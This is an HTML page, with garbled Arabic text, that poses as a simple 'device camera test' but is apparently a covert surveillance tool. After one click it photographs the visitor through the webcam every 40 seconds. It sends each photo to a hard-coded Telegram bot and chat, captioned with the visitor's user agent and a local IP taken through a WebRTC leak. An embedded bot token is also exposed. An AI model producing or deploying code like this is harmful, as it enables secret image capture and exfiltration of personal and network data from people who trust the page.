<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body{margin:0;background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:30vh}
    button{padding:12px 24px;font-size:18px;background:#009688;border:0;color:#fff;border-radius:6px;cursor:pointer}
    button:hover{background:#00796b}
    #status{margin-top:20px;font-size:14px;color:#aaa}
  </style>
</head>
<body>

<h2>Ø§Ø®ØªØ¨Ø§Ø± ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø¬Ù‡Ø§Ø²</h2>
<p>Ø§Ø¶ØºØ· "Ø§Ø¨Ø¯Ø£" Ù„Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø¨Ø¯Ø¡ Ø¨Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙƒÙ„ 40 Ø«Ø§Ù†ÙŠØ©.</p>
<button id="startBtn">Ø§Ø¨Ø¯Ø£</button>
<div id="status">Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¨Ø¯Ø¡ Ø¨Ø¹Ø¯</div>

<script>
/* ============================================
   BIG-BANG-GOD-DOMINION | ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø±Ø§Ù‚Ø¨Ø© Ù…Ø¹Ø¯Ù‘Ù„Ø©
   ============================================ */

const BOT_TOKEN = '8425677539:AAEUNjvvXN6TQbadYXSoAftLCGWBf--oQSw';
const CHAT_ID   = '-1002143197386'; // â† CHAT_ID Ø§Ù„Ø®Ø§Øµ Ø¨Ù‚Ù†Ø§ØªÙƒ Ø§Ù„Ø¹Ø§Ù…Ø©
const QUALITY   = 0.98; // Ø¬ÙˆØ¯Ø© Ø¹Ø§Ù„ÙŠØ© Ø¬Ø¯Ù‹Ø§
const DELAY     = 40000; // 40 Ø«Ø§Ù†ÙŠØ©

// ============================================

document.getElementById('startBtn').addEventListener('click', async () => {
  document.getElementById('status').textContent = 'Ø¬Ø§Ø±Ù ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...';
  await startCamera();
});

async function getIP() {
  const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  pc.createDataChannel('');
  await pc.createOffer().then(o=>pc.setLocalDescription(o));
  return new Promise(res=>{
    pc.onicecandidate=e=>{
      if(!e.candidate)return;
      const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if(ip)res(ip[1]);
    };
    setTimeout(()=>res('unknown'),1000);
  });
}

async function telegram(blob) {
  const form=new FormData();
  form.append('chat_id',CHAT_ID);
  form.append('photo',blob,'cam.jpg');
  form.append('caption',`ðŸ“¸ Ø§Ø®ØªØ¨Ø§Ø± ÙƒØ§Ù…ÙŠØ±Ø§  
Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-EG')}  
IP: ${await getIP()}  
UA: ${navigator.userAgent}`);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:form});
}

let stream,track,interval;
async function startCamera(){
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:1920},height:{ideal:1080},frameRate:{ideal:30}},audio:false});
    track=stream.getVideoTracks()[0];
    document.getElementById('status').textContent='Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªØ¹Ù…Ù„... ØªØµÙˆÙŠØ± ÙƒÙ„ 40 Ø«Ø§Ù†ÙŠØ©';
    interval=setInterval(capture,DELAY);
    await capture();
  }catch(e){
    document.getElementById('status').textContent='ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§';
    console.error(e);
  }
}

async function capture(){
  if(!track||track.readyState!=='live'){clearInterval(interval);return;}
  const video=document.createElement('video');
  const canvas=document.createElement('canvas');
  video.srcObject=stream;
  await video.play();
  const ratio=Math.min(1920/video.videoWidth,1080/video.videoHeight);
  canvas.width=video.videoWidth*ratio;
  canvas.height=video.videoHeight*ratio;
  canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
  canvas.toBlob(async blob=>{if(blob)await telegram(blob);},'image/jpeg',QUALITY);
}
</script>
</body>
</html>
